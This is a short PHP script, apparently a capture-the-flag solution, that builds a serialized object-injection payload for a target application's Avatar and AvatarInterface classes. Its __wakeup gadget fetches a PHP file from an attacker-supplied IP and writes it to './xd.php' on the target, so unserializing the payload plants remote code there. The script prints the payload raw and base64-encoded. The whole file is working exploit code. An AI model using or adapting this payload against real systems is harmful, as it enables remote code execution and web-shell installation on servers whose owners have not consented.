<?php

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "";
    public $imgPath = "./xd.php"; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

function gen_payload($ip) {
    $a = new AvatarInterface();
    $a->tmp = "http://$ip/xd.php";
    $payload = serialize($a);
    echo sprintf("%s\n%s", $payload, base64_encode($payload));
}

gen_payload($argv[1]);
?>